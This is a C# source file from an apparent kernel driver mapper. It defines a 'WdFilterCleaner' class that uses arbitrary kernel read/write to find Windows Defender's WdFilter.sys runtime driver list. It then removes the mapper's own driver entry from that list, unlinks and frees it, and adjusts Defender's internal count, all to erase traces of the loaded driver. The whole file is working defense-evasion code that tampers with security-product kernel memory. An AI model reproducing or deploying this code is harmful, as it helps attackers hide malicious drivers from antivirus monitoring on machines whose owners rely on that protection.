using Aether.Mapper.Core.Logging;
using Aether.Mapper.Engine.Symbols;
using Aether.Mapper.Interop;
using Aether.Mapper.Runtime;
using System.Runtime.InteropServices;
using System.Text;

namespace Aether.Mapper.Engine.TraceCleaners;

internal sealed class WdFilterCleaner(DriverInterface driver, NtoskrnlModule ntoskrnlModule, ISymbolProvider symbolProvider) : ITraceCleaner
{
    private const string ModuleName = "WdFilter.sys";

    public async Task CleanAsync(CancellationToken cancellationToken)
    {
        KernelModule module;

        try
        {
            module = KernelModule.Load(driver, ModuleName);
        }
        catch
        {
            await Log.MessageAsync($"[WdFilter] Module not found: {ModuleName}", cancellationToken);
            return;
        }

        var rulesAddress = module.BaseAddress + await symbolProvider.GetOffsetAsync(ModuleName, "MpBmDocOpenRules", cancellationToken);
        var runtimeDriversCount = rulesAddress + 0x60;
        var runtimeDriversArray = driver.Read<nint>(rulesAddress + 0x68);
        var runtimeDriversListHead = rulesAddress + 0x70;
        var mpFreeDriverInfoExRefAddress = module.BaseAddress + await symbolProvider.GetOffsetAsync(ModuleName, "MpFreeDriverInfoEx", cancellationToken);

        var driverPath = driver.DriverPath[driver.DriverPath.IndexOf('\\')..];
        var driverPathLength = Encoding.Unicode.GetByteCount(driverPath);

        for (var entry = driver.Read<nint>(runtimeDriversListHead); 
             entry != runtimeDriversListHead; 
             entry = driver.Read<nint>(entry + Marshal.OffsetOf<ListEntry>(nameof(ListEntry.Flink))))
        {
            var imageNameString = driver.Read<UnicodeString>(entry + 0x10);

            if (imageNameString.Length == driverPathLength)
            {
                var imageName = driver.Read(imageNameString.Buffer, Encoding.Unicode, imageNameString.Length << 1);

                if (driverPath.Equals(imageName, StringComparison.OrdinalIgnoreCase))
                {
                    await Log.MessageAsync($"[WdFilter] Found entry: 0x{entry:x} ({imageName})", cancellationToken);

                    await RemoveFromRuntimeDriversArrayAsync(entry, runtimeDriversArray, runtimeDriversCount, cancellationToken);
                    await UnlinkEntryAsync(entry, cancellationToken);
                    
                    var count = driver.Read<int>(runtimeDriversCount);
                    driver.Write(runtimeDriversCount, count - 1);

                    await Log.MessageAsync($"[WdFilter] Table delete count decremented: {count} -> {count - 1}", cancellationToken);

                    var driverInfo = entry - 0x20;

                    if (driver.Read<ushort>(driverInfo) != 0xda18)
                    {
                        await Log.MessageAsync($"[WdFilter] DriverInfo magic value is invalid. DriverInfo will not be released to prevent bsod.", cancellationToken);
                        break;
                    }

                    ntoskrnlModule.CallCore<MpFreeDriverInfoExRef>(mpFreeDriverInfoExRefAddress, driverInfo);

                    await Log.MessageAsync("[WdFilter] DriverInfo freed", cancellationToken);
                }
            }
        }

        await Log.MessageAsync($"[WdFilter] Traces successfully cleaned", cancellationToken);
    }

    private async Task RemoveFromRuntimeDriversArrayAsync(nint entry, nint runtimeDriversArray, nint runtimeDriversCount, CancellationToken cancellationToken)
    {
        var removedRuntimeDriversArray = false;
        var sameIndexList = entry - 0x10;

        for (var i = 0; i < 256; i++)
        {
            var address = runtimeDriversArray + i * 8;
            var value = driver.Read<nint>(address);

            if (value == sameIndexList)
            {
                var emptyVal = runtimeDriversCount + 1;

                driver.Write(address, emptyVal);
                removedRuntimeDriversArray = true;
                break;
            }
        }

        if (!removedRuntimeDriversArray)
            await Log.MessageAsync("Failed to remove from RuntimeDriversArray", cancellationToken);
    }

    private async Task UnlinkEntryAsync(nint entry, CancellationToken cancellationToken)
    {
        var blinkOffset = Marshal.OffsetOf<ListEntry>(nameof(ListEntry.Blink));
        var flinkOffset = Marshal.OffsetOf<ListEntry>(nameof(ListEntry.Flink));

        var blink = driver.Read<nint>(entry + blinkOffset);
        var flink = driver.Read<nint>(entry + flinkOffset);

        driver.Write(blink + flinkOffset, flink);
        driver.Write(flink + blinkOffset, blink);

        await Log.MessageAsync($"[WdFilter] Entry unlinked: 0x{entry:x}", cancellationToken);
    }

    private delegate void MpFreeDriverInfoExRef(nint driverInfoAddress);

    [StructLayout(LayoutKind.Sequential)]
    private unsafe struct ListEntry
    {
        public ListEntry* Flink;
        public ListEntry* Blink;
    }
}